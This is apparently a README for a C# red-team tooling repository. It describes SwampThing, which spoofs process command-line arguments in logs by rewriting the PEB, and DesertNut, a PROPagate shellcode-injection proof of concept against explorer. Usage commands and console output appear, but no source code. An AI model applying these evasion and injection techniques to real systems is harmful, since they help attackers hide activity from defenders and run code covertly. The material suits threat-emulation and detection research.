# Sharp-Suite

The king is dead, long live the king. I am starting a new repo with code samples in C#. My heart is still with PowerShell <3, lets face it using in-line C# in PowerShell is a much nicer experience than actually using C#! However, threat emulation has to evolve over time and so does the tooling.

## Pwn?

### SwampThing

SwampThing lets you to spoof process command line args (x32/64). Essentially you create a process in a suspended state, rewrite the PEB, resume and finally revert the PEB. The end result is that logging infrastructure will record the fake command line args instead of the real ones. Think for example about launching a wmic xsl stylesheet for code execution but faking an innocuous wmic command.

```
C:\>SwampThing.exe -l C:\Windows\System32\notepad.exe -f C:\aaa.txt -r C:\bbb.txt
      /
     :;                \
     |l      _____     |;
     `8o __-~     ~\   d|     Swamp
      "88p;.  -._\_;.oP         Thing
       `>,% (\  (\./)8"
      ,;%%%:  ./V^^^V'
;;;,-::::::'_::\   ||\
8888oooooo.  :\`^^^/,,~--._
 oo.8888888888:`((( o.ooo888
   `o`88888888b` )) 888b8888
     b`888888888;(.,"888b888\
....  b`8888888:::::.`8888.
 `:::. `:::OOO:::::::.`OO' ;
   `.      "``::::::''.'        ~ b33f ~

[>] CreateProcess -> Suspended
[+] PE Arch                       : 64-bit
[+] Process Id                    : 10568
[+] PEB Base                      : 0xA3C2431000
[+] RTL_USER_PROCESS_PARAMETERS   : 0x20DA9760000
[+] CommandLine                   : 0x20DA9760070
[+] UNICODE_STRING |-> Len        : 66
                   |-> MaxLen     : 68
                   |-> pBuff      : 0x20DA9760658

[>] Rewrite -> RTL_USER_PROCESS_PARAMETERS
[+] RtlCreateProcessParametersEx  : 0xEAADF0
[+] RemoteAlloc                   : 0xEA0000
[+] Size                          : 1776
[?] Success, sleeping 500ms..

[>] Reverting RTL_USER_PROCESS_PARAMETERS
[+] Local UNICODE_STRING          : 0xEBC4D0
[+] Remote UNICODE_STRING.Buffer  : 0x20DA9B10000
[+] pRTL_USER_PROCESS_PARAMETERS  : 0x20DA9870FE0
[?] Success rewrote Len, MaxLen, Buffer..
```

### DesertNut

DesertNut is a proof-of-concept for code injection using subclassed window callbacks (more commonly known as PROPagate). The pertinent part here is that this does not use any suspect thread creation API's, instead as implied it hijacks window callbacks. DesertNut includes two flags: "-l" to list all potential properties that could be hijacked and "-i" to inject shellcode into explorer and execute notepad. Note that this POC is only designed for x64 (tested on Win10 RS5 & Win7) since it requires custom shellcode with a specific callback function prototype. For further details please see [this post](http://www.hexacorn.com/blog/2017/10/26/propagate-a-new-code-injection-trick/) by Hexacorn and [this post](https://modexp.wordpress.com/2018/08/23/process-injection-propagate/) by modexp.

```
C:\> DesertNut.exe -i
           ,                        '           .        '        ,
   .            .        '       .         ,
                                                   .       '     +
       +          .-'''''-.
                .'         `.   +     .     ________||
       ___     :             :     |       /        ||  .     '___
  ____/   \   :               :   ||.    _/      || ||\_______/   \
 /         \  :      _/|      :   `|| __/      ,.|| ||             \
/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
 ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
           _/~  `''~`'` \_           ''(       ....,||/       '
 ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
              '`  `\   \  \-.\        /(_1_,..      || /
                                            ______/''''

[+] Searching for Subclass property..
[>] PID: 10928, ImageName: explorer
    |-> ParentClassName: Progman, ChildClassName: SHELLDLL_DefView
[+] Duplicating Subclass header..
[>] hProc: 0x378
[>] hProperty: 0x6B14DD0
    |-> uRefs: 2, uAlloc: 3, uCleanup: 0
    |-> dwThreadId: 5804, pFrameCur: 0
    |-> pfnSubclass: 0x7FFA20E42280 --> comctl32!CallOriginalWndProc (?)
    |-> uIdSubclass: 0, dwRefData: 0x7FFA2E4C07D0
[+] Allocating remote shellcode..
    |-> Sc Len: 344
    |-> Sc Address: 0x3220000
[+] Rewriting local SUBCLASS_HEADER..
[+] Allocating remote SUBCLASS_HEADER..
    |-> Subclass header Len: 48
    |-> Subclass header Address: 0x3260000
[+] Updating original UxSubclassInfo subclass procedure..
[+] Trigger remote shellcode --> notepad..
[+] Restoring original UxSubclassInfo subclass procedure..
[+] Freeing remote SUBCLASS_HEADER & shellcode..

C:\> DesertNut.exe -l
           ,                        '           .        '        ,
   .            .        '       .         ,
                                                   .       '     +
       +          .-'''''-.
                .'         `.   +     .     ________||
       ___     :             :     |       /        ||  .     '___
  ____/   \   :               :   ||.    _/      || ||\_______/   \
 /         \  :      _/|      :   `|| __/      ,.|| ||             \
/  ,   '  . \  :   =/_/      :     |'_______     || ||  ||   .      \
    |        \__`._/ |     .'   ___|        \__   \\||  ||...    ,   \
   l|,   '   (   /  ,|...-'        \   '   ,     __\||_//___
 ___|____     \_/^\/||__    ,    .  ,__             ||//    \    .  ,
           _/~  `''~`'` \_           ''(       ....,||/       '
 ..,...  __/  -'/  `-._ `\_\__        | \           ||  _______   .
              '`  `\   \  \-.\        /(_1_,..      || /
                                            ______/''''


[+] Subclassed Window Properties
[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x1BC84BF0, hParentWnd: 0xA0710, hChildWnd: 0x100650
    |-> ParentClassName: Shell_TrayWnd, ChildClassName: Start

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x1BC84C70, hParentWnd: 0xA0710, hChildWnd: 0x1C064C
    |-> ParentClassName: Shell_TrayWnd, ChildClassName: TrayDummySearchControl

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A64F0, hParentWnd: 0x1C064C, hChildWnd: 0x800E8
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Button

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A58F0, hParentWnd: 0x1C064C, hChildWnd: 0x1504A4
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: Static

[>] PID: 10928, ImageName: explorer
    |-> hProperty: 0x12A5870, hParentWnd: 0x1C064C, hChildWnd: 0x110814
    |-> ParentClassName: TrayDummySearchControl, ChildClassName: ToolbarWindow32

[...Snipped...]
```

## Windows API

### SystemProcessAndThreadsInformation

While working on a side project I had to access out-of-process thread information, to do this I used NtQuerySystemInformation -> SystemProcessAndThreadInformation. As it may be helpful for reference I wrote a small wrapper round this function to list process and thread information for a specific PID. Note that I am not extracting all available information from SYSTEM_PROCESSES and SYSTEM_THREAD_INFORMATION, feel free to extend the output with a pull request.

```
C:\> SystemProcessAndThreadsInformation.exe -p 4508

[+] Process Details
    ImageName           : powershell.exe
    ProcessId           : 4508
    ParentPid           : 8256
    HandleCount         : 701
    ThreadCount         : 25
    SessionId           : 1
    Priority            : 8
    CreateTime          : 0d:22h:0m:31s:876ms
    UserTime            : 0d:0h:0m:0s:328ms
    KernelTime          : 0d:0h:0m:0s:281ms
    WorkingSetSize      : 73.52734375 MB
    PeakWorkingSetSize  : 73.5859375 MB
    PageFaultCount      : 26896

[+] Thread Details
[>] TID: 9832, Priority: 9
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:876ms, uTime: 0d:0h:0m:0s:46ms, kTime: 0d:0h:0m:0s:93ms
    |-> WaitTime: 5843708, WaitReason: UserRequest
    |-> State: Wait, ContextSwitches: 232

[>] TID: 5552, Priority: 8
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:15ms
    |-> WaitTime: 5843460, WaitReason: WrQueue
    |-> State: Wait, ContextSwitches: 38

[>] TID: 15716, Priority: 8
    |-> StartAddress: 0x7FFB84833670
    |-> Created: 0d:22h:0m:31s:970ms, uTime: 0d:0h:0m:0s:15ms, kTime: 0d:0h:0m:0s:0ms
    |-> WaitTime: 5843460, WaitReason: WrQueue
    |-> State: Wait, ContextSwitches: 30

[...Snipped...]
```